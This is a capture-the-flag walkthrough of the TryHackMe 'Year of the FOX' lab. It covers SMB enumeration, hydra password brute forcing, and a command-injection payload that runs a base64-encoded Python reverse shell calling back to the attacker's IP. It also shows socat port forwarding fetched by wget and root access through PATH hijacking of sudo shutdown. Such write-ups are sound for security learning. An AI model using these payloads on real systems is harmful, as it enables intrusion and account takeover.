---
title: Year of the FOX
categories: [TryHackMe , Walkthrough]
tags: [SMB, Password Bruteforce, Command Injection, Port Forwording, SSH Bruteforce, SUIDs]
image:
  path: https://i.ytimg.com/vi/52ve4d89fYg/maxresdefault.jpg
  alt: Year of the FOX 🦊 
---

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/yotf]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.81.15
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 12:56 IST
Nmap scan report for 10.10.81.15
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
80/tcp    open     http    Apache httpd 2.4.29
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=You want in? Gotta guess the password!
43777/tcp filtered unknown
Service Info: Host: year-of-the-fox.lan

Service detection performed.
```

## Web Enumeration ⤵️

Since I got the Login-page first while loading the port 80 :

and I don’t have the credentials so I enumerated the SMB shares with a Tools called as enum4linux ⤵️ 

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/yotf]
└─$ enum4linux -a 10.10.81.15         
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Sep 21 13:00:46 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.81.15
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================( Enumerating Workgroup/Domain on 10.10.81.15 )============================

[+] Got domain/workgroup name: YEAROFTHEFOX

 ================================( Nbtstat Information for 10.10.81.15 )================================

Looking up status of 10.10.81.15
	YEAR-OF-THE-FOX <00> -         B <ACTIVE>  Workstation Service
	YEAR-OF-THE-FOX <03> -         B <ACTIVE>  Messenger Service
	YEAR-OF-THE-FOX <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	YEAROFTHEFOX    <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	YEAROFTHEFOX    <1d> -         B <ACTIVE>  Master Browser
	YEAROFTHEFOX    <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================( Session Check on 10.10.81.15 )====================================

[+] Server 10.10.81.15 allows sessions using username '', password ''

 =================================( Getting domain SID for 10.10.81.15 )=================================

Domain Name: YEAROFTHEFOX
Domain Sid: (NULL SID)

[+] Cant determine if host is part of domain or part of a workgroup

 ===================================( OS information on 10.10.81.15 )===================================

[E] Cant get OS info with smbclient

[+] Got OS info for 10.10.81.15 from srvinfo: 
	YEAR-OF-THE-FOXWk Sv PrQ Unx NT SNT year-of-the-fox server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ========================================( Users on 10.10.81.15 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: fox	Name: fox	Desc: 

user:[fox] rid:[0x3e8]

 ==================================( Share Enumeration on 10.10.81.15 )==================================

	Sharename       Type      Comment
	---------       ----      -------
	yotf            Disk      Foxs Stuff -- keep out!
	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	YEAROFTHEFOX         YEAR-OF-THE-FOX

[+] Attempting to map shares on 10.10.81.15

//10.10.81.15/yotf	Mapping: DENIED Listing: N/A Writing: N/A

[E] Cant understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.81.15/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 10.10.81.15 )============================

[+] Attaching to 10.10.81.15 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] YEAR-OF-THE-FOX
	[+] Builtin

[+] Password Info for Domain: YEAR-OF-THE-FOX

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

 =======================================( Groups on 10.10.81.15 )=======================================

[+] Getting builtin groups:

[+]  Getting builtin group memberships:

[+]  Getting local groups:

[+]  Getting local group memberships:

[+]  Getting domain groups:

[+]  Getting domain group memberships:

 ===================( Users on 10.10.81.15 via RID cycling (RIDS: 500-550,1000-1050) )===================

[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\fox (Local User)
S-1-22-1-1001 Unix User\rascal (Local User)

[+] Enumerating users using SID S-1-5-21-978893743-2663913856-222388731 and logon username '', password ''

S-1-5-21-978893743-2663913856-222388731-501 YEAR-OF-THE-FOX\nobody (Local User)
S-1-5-21-978893743-2663913856-222388731-513 YEAR-OF-THE-FOX\None (Domain Group)
S-1-5-21-978893743-2663913856-222388731-1000 YEAR-OF-THE-FOX\fox (Local User)

 ================================( Getting printer info for 10.10.81.15 )================================

No printers returned.

enum4linux complete on Thu Sep 21 13:13:48 2023
```

### Note : Each time you load this machine all the password gets changes .

I got 2 users mainly rascal and fox so I brute forced the password for Login page with user rascal and  i got the results →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/yotf]
└─$ hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.17.75 http-get / -t 60
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-21 21:19:51
[DATA] max 60 tasks per 1 server, overall 60 tasks, 14344399 login tries (l:1/p:14344399), ~239074 tries per task
[DATA] attacking http-get://10.10.17.75:80/
[STATUS] 5706.00 tries/min, 5706 tries in 00:01h, 14338693 to do in 41:53h, 60 active
[STATUS] 5881.33 tries/min, 17644 tries in 00:03h, 14326755 to do in 40:36h, 60 active
[80][http-get] host: 10.10.17.75   login: rascal   password: 250890
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-21 21:23:08
```

Now I logged in and got a search page like this →

![Untitled](/Vulnhub-Files/img/Year-of-the-FOX/Untitled.png)

Now with burpsuite I intercepted the request →

![Untitled](/Vulnhub-Files/img/Year-of-the-FOX/Untitled%201.png)

I founded the command injection possibility through pinging on my attackers machine like this →

![Untitled](/Vulnhub-Files/img/Year-of-the-FOX/Untitled%202.png)

Now I the payload of base 64 encode-decode one for reverse shell like this →

```bash
{"target":"\";echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjguODMuMTU2Iiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKTsn | base64 -d | bash ;
}
```

The base64 encode payload is this →

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.83.156",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Now I got the payload and the web flag →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/yotf]
└─$ nc -lvnp 4444                 
listening on [any] 4444 ...
connect to [10.8.83.156] from (UNKNOWN) [10.10.17.75] 34996
/bin/sh: 0: cant access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@year-of-the-fox:/var/www/html/assets/php$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                                                                
┌──(kali㉿kali)-[~/Downloads/Tryhackme/yotf]
└─$ stty raw -echo ;  fg ; reset ;
[1]  + continued  nc -lvnp 4444

www-data@year-of-the-fox:/var/www/html/assets/php$ 
www-data@year-of-the-fox:/var/www/html/assets/php$ cd /
www-data@year-of-the-fox:/$ cd /tmp
www-data@year-of-the-fox:/tmp$ ls -al
total 8
drwxrwxrwt  2 root root 4096 Sep 21 16:46 .
drwxr-xr-x 22 root root 4096 May 29  2020 ..
www-data@year-of-the-fox:/tmp$ 
www-data@year-of-the-fox:/tmp$ export TERM=xterm
www-data@year-of-the-fox:/tmp$
```

Now I checked the network interface to see what else is running and I got this →

```bash
www-data@year-of-the-fox:/tmp$ ss -tunlp | grep 127.0.0.1
tcp   LISTEN  0        128                127.0.0.1:22            0.0.0.0:*                                                                                     
www-data@year-of-the-fox:/tmp$
```

Since port 22 is running internally and not externally so lets check its ssh configuration file →

```bash
www-data@year-of-the-fox:/tmp$ cat /etc/ssh/sshd_config 
#	$OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

#Port 22
#AddressFamily any
ListenAddress 127.0.0.1 
#ListenAddress ::
...
...
#	PermitTTY no
#	ForceCommand cvs server
AllowUsers fox
www-data@year-of-the-fox:/tmp$
```

I noted that the victim machine is actually runing the port 22 internally and the ssh login is Allowed for fox user so lets now access this port 22 externally and for that I need to perform port forwording with `port2port` and I will be using the simple tool called `socat` that lets me interact this 22 port with other port on externally so lets do it .

Lets transfer the socat first like this →

```bash
www-data@year-of-the-fox:/tmp$ wget http://10.8.83.156/socat_x86
--2023-09-21 16:56:04--  http://10.8.83.156/socat_x86
Connecting to 10.8.83.156:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: 'socat_x86'

socat_x86           100%[===================>] 366.38K   328KB/s    in 1.1s    

2023-09-21 16:56:06 (328 KB/s) - 'socat_x86' saved [375176/375176]

www-data@year-of-the-fox:/tmp$ chmod +x *
www-data@year-of-the-fox:/tmp$
```

Now lets morph this port 22 to 2222 on victim machine so that we can access this 22 port externally through 2222 port it will be done like this ⤵️ 

```bash
www-data@year-of-the-fox:/tmp$ ./socat_x86 TCP-LISTEN:2222,reuseaddr,fork TCP:127.0.0.1:22 &
[1] 1021
www-data@year-of-the-fox:/tmp$
```

Now lets try to access the 2222 port from attackers machine like this →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/yotf]
└─$ ssh fox@10.10.167.224 -p 2222
The authenticity of host '[10.10.167.224]:2222 ([10.10.167.224]:2222)' cant be established.
ED25519 key fingerprint is SHA256:ytuC6e5+2EWnZLeockeugHFQMCmIRWlKFJR/MF8JPJo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.167.224]:2222' (ED25519) to the list of known hosts.
fox@10.10.167.224s password:
```

I see , so I can access this port so lets brute force the password of user FOX which we want to connect to →

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/yotf]
└─$ hydra -l fox -P /usr/share/wordlists/rockyou.txt 10.10.17.75 ssh -t 64 -s 2222
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-21 21:27:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://10.10.17.75:2222/
[2222][ssh] host: 10.10.17.75   login: fox   password: pokemon
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 16 final worker threads did not complete until end.
[ERROR] 16 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-21 21:27:25
```

Now Its SSH Time ⤵️ 

## SSH Login ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Tryhackme/yotf]
└─$ ssh fox@10.10.17.75 -p 2222  
The authenticity of host '[10.10.17.75]:2222 ([10.10.17.75]:2222)' cant be established.
ED25519 key fingerprint is SHA256:ytuC6e5+2EWnZLeockeugHFQMCmIRWlKFJR/MF8JPJo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:104: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.17.75]:2222' (ED25519) to the list of known hosts.
fox@10.10.17.75s password: 

	__   __                       __   _   _            _____         
	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  ___|____  __
	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_ / _ \ \/ /
	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  _| (_) >  < 
	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|  \___/_/\_\

                                                                  
fox@year-of-the-fox:~$ ls -al
total 36
drwxr-x--- 5 fox  fox  4096 Jun 20  2020 .
drwxr-xr-x 4 root root 4096 May 28  2020 ..
lrwxrwxrwx 1 fox  fox     9 May 28  2020 .bash_history -> /dev/null
-rw-r--r-- 1 fox  fox   220 May 28  2020 .bash_logout
-rw-r--r-- 1 fox  fox  3771 May 28  2020 .bashrc
drwx------ 2 fox  fox  4096 May 28  2020 .cache
drwx------ 3 fox  fox  4096 May 28  2020 .gnupg
-rw-r--r-- 1 fox  fox   807 May 28  2020 .profile
drwxr-xr-x 2 fox  fox  4096 Jun 20  2020 samba
-rw-r--r-- 1 fox  fox     0 May 28  2020 .sudo_as_admin_successful
-rw-r--r-- 1 root root   38 May 31  2020 user-flag.txt
fox@year-of-the-fox:~$ cat user-flag.txt 
THM{Njg3NWZhNDBjMmNlMzNkMGZmMDBhYjhk}
fox@year-of-the-fox:~$ sudo -l
Matching Defaults entries for fox on year-of-the-fox:
    env_reset, mail_badpass

User fox may run the following commands on year-of-the-fox:
    (root) NOPASSWD: /usr/sbin/shutdown
fox@year-of-the-fox:~$ echo /bin/bash > /tmp/poweroff
fox@year-of-the-fox:~$ chmod +x /tmp/poweroff
fox@year-of-the-fox:~$ export PATH=/tmp:$PATH
fox@year-of-the-fox:~$ sudo /usr/sbin/shutdown
root@year-of-the-fox:~# whoami
root
root@year-of-the-fox:~# id
uid=0(root) gid=0(root) groups=0(root)
root@year-of-the-fox:~# cd /root
root@year-of-the-fox:/root# ls -al
total 36
drwx------  5 root root 4096 Sep 21 16:46 .
drwxr-xr-x 22 root root 4096 May 29  2020 ..
lrwxrwxrwx  1 root root    9 May 28  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 May 30  2020 .cache
drwx------  3 root root 4096 May 30  2020 .gnupg
drwxr-xr-x  3 root root 4096 May 28  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   21 May 31  2020 root.txt
-rw-r--r--  1 root root   75 May 31  2020 .selected_editor
root@year-of-the-fox:/root# cat root.txt 
Not here -- go find!
root@year-of-the-fox:/root#
root@year-of-the-fox:/root# cd /home
root@year-of-the-fox:/home# ls
fox  rascal
root@year-of-the-fox:/home# cd rascal
root@year-of-the-fox:/home/rascal# ls -al
total 24
drwxr-x--- 2 rascal rascal 4096 Jun  1  2020 .
drwxr-xr-x 4 root   root   4096 May 28  2020 ..
lrwxrwxrwx 1 root   root      9 May 28  2020 .bash_history -> /dev/null
-rw-r--r-- 1 rascal rascal  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 rascal rascal 3771 Apr  4  2018 .bashrc
-r-------- 1 rascal root    158 Jun  9  2020 .did-you-think-I-was-useless.root
-rw-r--r-- 1 rascal rascal  807 Apr  4  2018 .profile
root@year-of-the-fox:/home/rascal# cat .did-you-think-I-was-useless.root 
T
H
M
{ODM3NTdk
MDljYmM4Z
jdhZWFhY2
VjY2Fk}

Here is the prize:

YTAyNzQ3ODZlMmE2MjcwNzg2NjZkNjQ2Nzc5NzA0NjY2Njc2NjY4M2I2OTMyMzIzNTNhNjk2ODMw
Mwo=

Good luck!
root@year-of-the-fox:/home/rascal#
```

>This machine mainly teaches me about Port Forwording !!
{: .prompt-tip }